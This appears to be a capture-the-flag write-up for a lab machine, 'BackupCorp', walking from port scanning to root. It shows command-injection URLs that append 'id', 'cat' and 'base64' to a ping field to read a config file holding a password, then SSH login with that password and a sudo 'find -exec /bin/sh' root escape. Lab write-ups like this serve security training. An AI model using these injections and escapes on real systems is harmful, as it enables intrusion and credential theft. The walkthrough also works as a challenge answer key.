# BackupCorp — Writeup

Full intended walkthrough. Replace `<IP>` with the machine IP, and the flag
placeholders with the real random values your box generated.

### 1. Recon
```
nmap -sV -sC <IP>
```
Expected:
```
22/tcp open  ssh      OpenSSH ...
80/tcp open  http     Apache httpd 2.4.x
```
→ 2 open ports; port 22 = ssh.

### 2. Web enumeration
```
curl http://<IP>/robots.txt
```
```
User-agent: *
Disallow: /admin
```
Browse `http://<IP>/admin/` → the **Network Tools** ping page.

### 3. Command injection (foothold)
In the `host` field (or directly in the URL), append a command:
```
http://<IP>/admin/index.php?host=127.0.0.1;id
```
→ returns `uid=33(www-data) gid=33(www-data) ...`  → user is **www-data**.

Read the leaked config. NOTE: a `.php` file read in the **browser** looks empty,
because the browser hides the `<?php ... ?>` tags. Use **curl** from the terminal
(or View Source / base64) to see it:
```
curl "http://<IP>/admin/index.php?host=127.0.0.1;cat+/var/www/html/admin/config.php"
```
Browser alternatives:
- View Source (Ctrl+U) and search for `db_pass`, or
- base64 it and decode locally:
  `curl "http://<IP>/admin/index.php?host=127.0.0.1;base64+/var/www/html/admin/config.php"`
  then `echo '<string>' | base64 -d`

→ reveals:
```
$db_user = "developer";
$db_pass = "Sup3rS3cr3t_Backups!";
```

### 4. Upgrade to a real user + user flag
```
ssh developer@<IP>
# password: Sup3rS3cr3t_Backups!
cat ~/user.txt
```
→ **user.txt = THM{...}**  (the real value is in /root/SOLUTION_DELETE_ME.txt)

### 5. Privilege escalation
```
sudo -l
```
```
User developer may run the following commands:
    (root) NOPASSWD: /usr/bin/find
```
Abuse via GTFOBins:
```
sudo /usr/bin/find . -exec /bin/sh \; -quit
# now root
id        # uid=0(root)
cat /root/root.txt
```
→ **root.txt = THM{...}**
